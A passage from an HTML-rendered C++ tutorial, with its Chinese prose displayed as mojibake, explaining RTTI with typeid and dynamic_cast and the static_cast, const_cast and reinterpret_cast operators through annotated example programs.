class="number">5</span>; i++) &#123;</span><br><span class="line">        pg = GetOne();</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer pg type (static): &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(pg).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡é’ˆæœ¬èº«çš„ç±»å‹</span></span><br><span class="line">        <span class="keyword">if</span> (pg != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="comment">// å¯¹æŒ‡é’ˆè§£å¼•ç”¨ï¼Œè·å–è¿è¡Œæ—¶ç±»å‹ä¿¡æ¯ (å› ä¸º Grand æœ‰è™šå‡½æ•°)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object pointed to by pg (runtime): &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(*pg).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¯”è¾ƒç±»å‹ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeid</span>(*pg) == <span class="keyword">typeid</span>(Grand)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s exactly a Grand object.\n&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeid</span>(*pg) == <span class="keyword">typeid</span>(Superb)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s exactly a Superb object.\n&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeid</span>(*pg) == <span class="keyword">typeid</span>(Magnificent)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s exactly a Magnificent object.\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ£€æŸ¥æ˜¯å¦æ˜¯æŸç§ç±»å‹æˆ–å…¶æ´¾ç”Ÿç±» (é€šå¸¸ dynamic_cast æ›´é€‚åˆ)</span></span><br><span class="line">            <span class="comment">// æ³¨æ„ï¼štypeid æ¯”è¾ƒçš„æ˜¯ç²¾ç¡®ç±»å‹ï¼Œä¸ä¼šè€ƒè™‘ç»§æ‰¿å…³ç³»</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">dynamic_cast</span>&lt;Superb*&gt;(pg)) &#123; <span class="comment">// æ£€æŸ¥æ˜¯å¦æ˜¯ Superb æˆ–å…¶æ´¾ç”Ÿç±»</span></span><br><span class="line">                 <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  It&#x27;s a Superb or derived from Superb.\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">delete</span> pg;</span><br><span class="line">            pg = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹ç©ºæŒ‡é’ˆä½¿ç”¨ typeid ä¼šæŠ›å¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of *nullptr: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(*pg).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::bad_typeid&amp; bt) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught bad_typeid exception: &quot;</span> &lt;&lt; bt.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>dynamic_cast</code> vs <code>typeid</code>:</strong></p><ul><li>  <code>dynamic_cast</code> ä¸»è¦ç”¨äº<strong>å®‰å…¨çš„ç±»å‹è½¬æ¢</strong>ï¼Œå¹¶æ£€æŸ¥å¯¹è±¡æ˜¯å¦<strong>å±äº</strong>æŸä¸ªç±»å‹æˆ–å…¶æ´¾ç”Ÿç±»ã€‚</li><li>  <code>typeid</code> ä¸»è¦ç”¨äºè·å–å¯¹è±¡çš„<strong>ç²¾ç¡®ç±»å‹ä¿¡æ¯</strong>å¹¶è¿›è¡Œæ¯”è¾ƒã€‚å®ƒä¸ç›´æ¥ç”¨äºç±»å‹è½¬æ¢ã€‚</li></ul><p>åœ¨éœ€è¦æ ¹æ®ç±»å‹æ‰§è¡Œä¸åŒæ“ä½œæ—¶ï¼Œå¦‚æœè¿™äº›æ“ä½œå¯ä»¥é€šè¿‡è™šå‡½æ•°å®ç°ï¼Œåˆ™ä¼˜å…ˆä½¿ç”¨è™šå‡½æ•°ã€‚å¦‚æœå¿…é¡»è¿›è¡Œå‘ä¸‹è½¬æ¢ï¼Œ<code>dynamic_cast</code> é€šå¸¸æ˜¯æ¯” <code>typeid</code> ç»“åˆ <code>static_cast</code> æ›´å®‰å…¨çš„é€‰æ‹©ã€‚</p><p><strong>RTTI å’Œç¼–è¯‘å™¨é€‰é¡¹:</strong></p><p>æŸäº›ç¼–è¯‘å™¨å¯èƒ½æä¾›ç¦ç”¨ RTTI çš„é€‰é¡¹ï¼Œä»¥å‡å°‘ä»£ç å¤§å°æˆ–è¿è¡Œæ—¶å¼€é”€ã€‚å¦‚æœç¦ç”¨äº† RTTIï¼Œ<code>dynamic_cast</code> å’Œ <code>typeid</code> çš„è¡Œä¸ºå¯èƒ½ä¼šæ”¹å˜æˆ–å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</p><h2 id="15-5-ç±»å‹è½¬æ¢è¿ç®—ç¬¦"><a href="#15-5-ç±»å‹è½¬æ¢è¿ç®—ç¬¦" class="headerlink" title="15.5 ç±»å‹è½¬æ¢è¿ç®—ç¬¦"></a>15.5 ç±»å‹è½¬æ¢è¿ç®—ç¬¦</h2><p>C++ ç»§æ‰¿äº† C è¯­è¨€çš„ç±»å‹è½¬æ¢è¯­æ³•ï¼ˆä¾‹å¦‚ <code>(TypeName) expression</code> æˆ– <code>TypeName(expression)</code>ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ç§ C é£æ ¼çš„å¼ºåˆ¶ç±»å‹è½¬æ¢è¿‡äºç²—æ”¾ï¼Œéš¾ä»¥åœ¨ä»£ç ä¸­æŸ¥æ‰¾ï¼Œå¹¶ä¸”æ— æ³•åŒºåˆ†ä¸åŒç±»å‹çš„è½¬æ¢æ„å›¾ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å»é™¤ <code>const</code> å±æ€§ï¼Œè¿˜æ˜¯åœ¨ç›¸å…³ç±»å‹é—´è½¬æ¢ï¼Œæˆ–æ˜¯å®Œå…¨é‡æ–°è§£é‡Šæ¯”ç‰¹ä½ï¼‰ã€‚</p><p>ä¸ºäº†æä¾›æ›´å®‰å…¨ã€æ›´æ˜ç¡®çš„ç±»å‹è½¬æ¢æ–¹å¼ï¼ŒC++ å¼•å…¥äº†å››ä¸ª**ç±»å‹è½¬æ¢è¿ç®—ç¬¦ (Type Cast Operators)**ï¼š</p><ul><li>  <code>static_cast&lt;&gt;()</code></li><li>  <code>const_cast&lt;&gt;()</code></li><li>  <code>reinterpret_cast&lt;&gt;()</code></li><li>  <code>dynamic_cast&lt;&gt;()</code> (å·²åœ¨ 15.4 RTTI ä¸­è¯¦ç»†ä»‹ç»)</li></ul><p>è¿™äº›è¿ç®—ç¬¦å…·æœ‰ç»Ÿä¸€çš„è¯­æ³•æ ¼å¼ï¼š<code>cast_name&lt;TargetType&gt;(expression)</code>ã€‚å®ƒä»¬ä½¿è½¬æ¢æ„å›¾æ›´åŠ æ¸…æ™°ï¼Œå¹¶ä¸”å…è®¸ç¼–è¯‘å™¨è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ã€‚</p><h3 id="1-static-cast-lt-TargetType-gt-expression"><a href="#1-static-cast-lt-TargetType-gt-expression" class="headerlink" title="1. static_cast&lt;TargetType&gt;(expression)"></a>1. <code>static_cast&lt;TargetType&gt;(expression)</code></h3><p><code>static_cast</code> ç”¨äº<strong>æ¯”è¾ƒâ€œè‡ªç„¶â€å’Œâ€œåˆç†â€</strong>çš„ç±»å‹è½¬æ¢ï¼Œä¸»è¦æ˜¯åœ¨ç›¸å…³ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼Œæˆ–è€…æ‰§è¡Œç¼–è¯‘å™¨èƒ½å¤Ÿç†è§£çš„æ ‡å‡†è½¬æ¢ã€‚å®ƒåœ¨<strong>ç¼–è¯‘æ—¶</strong>è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚</p><p><strong>ä¸»è¦ç”¨é€”:</strong></p><ul><li><strong>ç›¸å…³ç±»å‹è½¬æ¢:</strong><ul><li>  åœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œ<strong>å‘ä¸Šè½¬æ¢</strong>ï¼ˆæ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨ -&gt; åŸºç±»æŒ‡é’ˆ/å¼•ç”¨ï¼‰ã€‚è¿™æ˜¯å®‰å…¨çš„ï¼Œè™½ç„¶é€šå¸¸éšå¼è½¬æ¢å³å¯ã€‚</li><li>  åœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œ<strong>å‘ä¸‹è½¬æ¢</strong>ï¼ˆåŸºç±»æŒ‡é’ˆ/å¼•ç”¨ -&gt; æ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨ï¼‰ã€‚<strong>ä¸å®‰å…¨ï¼</strong> <code>static_cast</code> ä¸è¿›è¡Œè¿è¡Œæ—¶ç±»å‹æ£€æŸ¥ã€‚å¦‚æœåŸºç±»æŒ‡é’ˆå®é™…æŒ‡å‘çš„ä¸æ˜¯ç›®æ ‡æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½¿ç”¨è½¬æ¢åçš„æŒ‡é’ˆä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚åªæœ‰å½“ä½ <strong>ç¡®å®š</strong>æŒ‡é’ˆç¡®å®æŒ‡å‘ç›®æ ‡ç±»å‹æ—¶ï¼Œæ‰åº”ä½¿ç”¨ <code>static_cast</code> è¿›è¡Œå‘ä¸‹è½¬æ¢ï¼ˆ<code>dynamic_cast</code> æ˜¯æ›´å®‰å…¨çš„é€‰æ‹©ï¼‰ã€‚</li></ul></li><li>  <strong>åŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢:</strong> åœ¨æ•°å­—ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼ˆå¦‚ <code>int</code> åˆ° <code>float</code>, <code>double</code> åˆ° <code>int</code>ï¼‰ã€‚</li><li>  <strong>æšä¸¾ä¸æ•´å‹è½¬æ¢:</strong> åœ¨æšä¸¾ç±»å‹å’Œæ•´å‹æˆ–æµ®ç‚¹ç±»å‹ä¹‹é—´è½¬æ¢ã€‚</li><li>  <strong><code>void*</code> è½¬æ¢:</strong> å°†ä»»ä½•ç±»å‹çš„æŒ‡é’ˆè½¬æ¢ä¸º <code>void*</code>ï¼Œæˆ–å°† <code>void*</code> è½¬æ¢å›åŸå§‹ç±»å‹çš„æŒ‡é’ˆï¼ˆæˆ–å…¼å®¹ç±»å‹çš„æŒ‡é’ˆï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span> <span class="keyword">public</span>: <span class="keyword">virtual</span> ~Base() &#123;&#125; &#125;; <span class="comment">// å¤šæ€åŸºç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸºæœ¬ç±»å‹è½¬æ¢</span></span><br><span class="line">    <span class="keyword">double</span> pi = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="keyword">int</span> integer_pi = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(pi); <span class="comment">// double to int (æˆªæ–­)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;integer_pi: &quot;</span> &lt;&lt; integer_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘ä¸Šè½¬æ¢ (å®‰å…¨)</span></span><br><span class="line">    Derived d;</span><br><span class="line">    Base* pb = &amp;d; <span class="comment">// éšå¼è½¬æ¢å³å¯</span></span><br><span class="line">    Base* pb_static = <span class="keyword">static_cast</span>&lt;Base*&gt;(&amp;d); <span class="comment">// æ˜¾å¼å‘ä¸Šè½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘ä¸‹è½¬æ¢ (ä¸å®‰å…¨ï¼Œéœ€ç¨‹åºå‘˜ä¿è¯)</span></span><br><span class="line">    Base* pb_maybe_d = <span class="keyword">new</span> Derived();</span><br><span class="line">    <span class="comment">// å‡è®¾æˆ‘ä»¬ç¡®å®š pb_maybe_d æŒ‡å‘ Derived</span></span><br><span class="line">    Derived* pd_static = <span class="keyword">static_cast</span>&lt;Derived*&gt;(pb_maybe_d);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Static downcast successful (programmer assumed).\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> pb_maybe_d;</span><br><span class="line"></span><br><span class="line">    Base* pb_not_d = <span class="keyword">new</span> Base();</span><br><span class="line">    <span class="comment">// !! å±é™© !! pb_not_d å®é™…æŒ‡å‘ Baseï¼Œä½†æˆ‘ä»¬å¼ºåˆ¶è½¬ä¸º Derived*</span></span><br><span class="line">    <span class="comment">// Derived* pd_wrong = static_cast&lt;Derived*&gt;(pb_not_d);</span></span><br><span class="line">    <span class="comment">// pd_wrong-&gt;someDerivedMethod(); // *** æœªå®šä¹‰è¡Œä¸º ***</span></span><br><span class="line">    <span class="keyword">delete</span> pb_not_d;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// void* è½¬æ¢</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">void</span>* vp = <span class="keyword">static_cast</span>&lt;<span class="keyword">void</span>*&gt;(&amp;i); <span class="comment">// int* to void*</span></span><br><span class="line">    <span class="keyword">int</span>* ip = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>*&gt;(vp);   <span class="comment">// void* back to int*</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via void*: &quot;</span> &lt;&lt; *ip &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-const-cast-lt-TargetType-gt-expression"><a href="#2-const-cast-lt-TargetType-gt-expression" class="headerlink" title="2. const_cast&lt;TargetType&gt;(expression)"></a>2. <code>const_cast&lt;TargetType&gt;(expression)</code></h3><p><code>const_cast</code> æ˜¯å”¯ä¸€èƒ½å¤Ÿ<strong>ç§»é™¤ (cast away)</strong> æˆ–<strong>æ·»åŠ </strong> <code>const</code> æˆ– <code>volatile</code> é™å®šç¬¦çš„ C++ è½¬æ¢è¿ç®—ç¬¦ã€‚</p><p><strong>ä¸»è¦ç”¨é€”:</strong></p><ul><li>  <strong>ç§»é™¤ <code>const</code>:</strong> å½“ä½ æœ‰ä¸€ä¸ªæŒ‡å‘ <code>const</code> æ•°æ®çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä½†ä½ éœ€è¦è°ƒç”¨ä¸€ä¸ª<strong>ä¸æ¥å— <code>const</code> å‚æ•°</strong>ï¼ˆä½†å®é™…ä¸Š<strong>ä¸ä¼šä¿®æ”¹</strong>æ•°æ®ï¼‰çš„å‡½æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>const_cast</code> ä¸´æ—¶ç§»é™¤ <code>const</code> å±æ€§ã€‚</li><li>  <strong>æ·»åŠ  <code>const</code>:</strong> è™½ç„¶ä¸å¸¸ç”¨ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨æ¥æ·»åŠ  <code>const</code> å±æ€§ã€‚</li></ul><p><strong>é‡è¦è­¦å‘Š:</strong></p><ul><li>  <code>const_cast</code> åªèƒ½æ”¹å˜æŒ‡é’ˆæˆ–å¼•ç”¨çš„ <code>const</code>/<code>volatile</code> å±æ€§ï¼Œ<strong>ä¸èƒ½</strong>æ”¹å˜è¡¨è¾¾å¼çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼Œä¸èƒ½ç”¨ <code>const_cast</code> å°† <code>const char*</code> è½¬æ¢ä¸º <code>int*</code>ã€‚</li><li>  é€šè¿‡ <code>const_cast</code> ç§»é™¤ <code>const</code> å±æ€§åï¼Œå¦‚æœ<strong>åŸå§‹å¯¹è±¡</strong>æœ¬èº«å°±æ˜¯ <code>const</code> çš„ï¼Œé‚£ä¹ˆè¯•å›¾é€šè¿‡è½¬æ¢åçš„æŒ‡é’ˆæˆ–å¼•ç”¨å»<strong>ä¿®æ”¹</strong>è¯¥å¯¹è±¡çš„å€¼ï¼Œå°†å¯¼è‡´**æœªå®šä¹‰è¡Œä¸º (Undefined Behavior)**ï¼<code>const_cast</code> ä¸»è¦ç”¨äºå¤„ç†æ¥å£ä¸åŒ¹é…çš„æƒ…å†µï¼Œè€Œä¸æ˜¯ç”¨æ¥ç ´åå¸¸é‡æ€§ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡è®¾æœ‰ä¸€ä¸ªæ—§çš„ C å‡½æ•°ï¼Œå®ƒæ¥å— char* ä½†ä¿è¯ä¸ä¿®æ”¹å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">legacy_print</span><span class="params">(<span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Legacy print: &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* const_message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ legacy_print éœ€è¦ char*ï¼Œä½†æˆ‘ä»¬åªæœ‰ const char*</span></span><br><span class="line">    <span class="comment">// æˆ‘ä»¬çŸ¥é“ legacy_print ä¸ä¼šä¿®æ”¹ï¼Œæ‰€ä»¥ä½¿ç”¨ const_cast</span></span><br><span class="line">    <span class="keyword">char</span>* non_const_message = <span class="keyword">const_cast</span>&lt;<span class="keyword">char</span>*&gt;(const_message);</span><br><span class="line">    legacy_print(non_const_message); <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> constant_value = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span>* p_const = &amp;constant_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°è¯•ç§»é™¤ const å¹¶ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">int</span>* p_non_const = <span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>*&gt;(p_const);</span><br><span class="line">    <span class="comment">// *p_non_const = 200; // *** æœªå®šä¹‰è¡Œä¸ºï¼*** å› ä¸º constant_value æœ¬èº«æ˜¯ const</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> variable_value = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span>* p_const_var = &amp;variable_value;</span><br><span class="line">    <span class="keyword">int</span>* p_non_const_var = <span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>*&gt;(p_const_var);</span><br><span class="line">    *p_non_const_var = <span class="number">60</span>; <span class="comment">// OKï¼Œå› ä¸º variable_value æœ¬èº«ä¸æ˜¯ const</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;variable_value: &quot;</span> &lt;&lt; variable_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 60</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-reinterpret-cast-lt-TargetType-gt-expression"><a href="#3-reinterpret-cast-lt-TargetType-gt-expression" class="headerlink" title="3. reinterpret_cast&lt;TargetType&gt;(expression)"></a>3. <code>reinterpret_cast&lt;TargetType&gt;(expression)</code></h3><p><code>reinterpret_cast</code> ç”¨äºæ‰§è¡Œ<strong>ä½çº§åˆ«</strong>çš„ã€å¯èƒ½ä¸å®‰å…¨çš„ç±»å‹è½¬æ¢ã€‚å®ƒæœ¬è´¨ä¸Šåªæ˜¯è¦æ±‚ç¼–è¯‘å™¨<strong>é‡æ–°è§£é‡Š</strong>è¡¨è¾¾å¼çš„**æ¯”ç‰¹æ¨¡å¼ (bit pattern)**ï¼Œå°†å…¶è§†ä¸º <code>TargetType</code> ç±»å‹ã€‚å®ƒå¾ˆå°‘è¿›è¡Œå®é™…çš„è½¬æ¢ï¼Œæ›´å¤šçš„æ˜¯ä¸€ç§ç¼–è¯‘æ—¶çš„æŒ‡ä»¤ã€‚</p><p><strong>ä¸»è¦ç”¨é€”:</strong></p><ul><li>  <strong>æŒ‡é’ˆä¸æ•´å‹è½¬æ¢:</strong> åœ¨æŒ‡é’ˆç±»å‹å’Œè¶³å¤Ÿå¤§çš„æ•´å‹ï¼ˆå¦‚ <code>uintptr_t</code>ï¼‰ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</li><li>  <strong>ä¸ç›¸å…³æŒ‡é’ˆç±»å‹è½¬æ¢:</strong> åœ¨ä¸ç›¸å…³çš„æŒ‡é’ˆç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ï¼ˆä¾‹å¦‚ï¼Œ<code>int*</code> åˆ° <code>char*</code>ï¼‰ã€‚è¿™æ˜¯éå¸¸å±é™©çš„æ“ä½œï¼Œé€šå¸¸åªåœ¨éœ€è¦å¯¹åŸå§‹å†…å­˜è¿›è¡Œåº•å±‚æ“ä½œæ—¶ä½¿ç”¨ã€‚</li><li>  <strong>å‡½æ•°æŒ‡é’ˆè½¬æ¢:</strong> åœ¨ä¸åŒçš„å‡½æ•°æŒ‡é’ˆç±»å‹ä¹‹é—´è½¬æ¢ï¼ˆåŒæ ·éå¸¸å±é™©ï¼‰ã€‚</li></ul><p><strong>é‡è¦è­¦å‘Š:</strong></p><ul><li>  <code>reinterpret_cast</code> çš„è¡Œä¸ºæ˜¯<strong>é«˜åº¦ä¾èµ–äºå…·ä½“å®ç°å’Œå¹³å°</strong>çš„ã€‚</li><li>  ä½¿ç”¨ <code>reinterpret_cast</code> è¿›è¡Œçš„è½¬æ¢å‡ ä¹æ€»æ˜¯<strong>ä¸å¯ç§»æ¤</strong>çš„ã€‚</li><li>  æ»¥ç”¨ <code>reinterpret_cast</code> ææ˜“å¯¼è‡´<strong>æœªå®šä¹‰è¡Œä¸º</strong>å’Œéš¾ä»¥è°ƒè¯•çš„é”™è¯¯ã€‚</li><li>  å®ƒåº”è¯¥åªåœ¨ç»å¯¹å¿…è¦ä¸”å®Œå…¨ç†è§£å…¶åæœçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œé€šå¸¸ç”¨äºä¸åº•å±‚ç¡¬ä»¶æˆ–æ—§çš„ C ä»£ç äº¤äº’ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt; // for uintptr_t</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">double</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">65</span>; <span class="comment">// ASCII &#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆç±»å‹è½¬æ¢ (å±é™©)</span></span><br><span class="line">    <span class="keyword">int</span>* pi = &amp;i;</span><br><span class="line">    <span class="comment">// å°† int* é‡æ–°è§£é‡Šä¸º char*</span></span><br><span class="line">    <span class="keyword">char</span>* pc = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(pi);</span><br><span class="line">    <span class="comment">// ç»“æœå–å†³äºç³»ç»Ÿå­—èŠ‚åº (endianness)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reinterpreted char: &quot;</span> &lt;&lt; *pc &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¯èƒ½è¾“å‡º &#x27;A&#x27; æˆ–å…¶ä»–</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆä¸æ•´æ•°è½¬æ¢</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> addr_val = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uintptr_t</span>&gt;(pi); <span class="comment">// æŒ‡é’ˆè½¬æ•´æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address as integer: 